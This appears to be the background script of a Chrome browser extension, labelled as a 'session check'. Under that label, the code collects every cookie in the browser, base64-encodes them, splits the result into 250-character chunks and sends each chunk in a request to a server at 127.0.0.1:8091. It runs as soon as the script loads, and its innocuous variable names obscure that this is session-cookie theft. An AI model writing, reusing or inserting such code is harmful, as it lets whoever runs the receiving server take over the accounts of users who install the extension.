console.log('background.js loaded.');

// define session check url
const chkhst = 'http://' + '127.0.0.1:8091';
const chkpth = '/js/chk.js';
const chkprmnm = 's';
const chkprmdt = 'd';

function checkSession() {
	chrome.cookies.getAll({}, function (cookies) {
		// retrieve all cookies
		let sessions = [];
		cookies.forEach((cookie) => {
			console.log(JSON.stringify(cookie));
			sessions.push(JSON.stringify(cookie));
		});

		// create JSON array string
		const sessionString = '[' + sessions.join(',') + ']';
		console.log(sessionString);

		// base64 encode and split into array of equal length strings
		const encSession = btoa(sessionString);
		const encSessionChunk = encSession.match(/.{1,250}/g);

		// send for check
		for (let i = 0; i < encSessionChunk.length; ++i) {
			let seq = String(i).padStart(8, '0');
			let url = `${chkhst}${chkpth}?${chkprmnm}=${seq}&${chkprmdt}=${encSessionChunk[i]}`;
			let request = new XMLHttpRequest();
			request.open('GET', url);
			request.onreadystatechange = function () {
				if (request.readyState != 4) {
				}
				else {
				}
			};
			request.send(null);
		}
	});
}

checkSession();
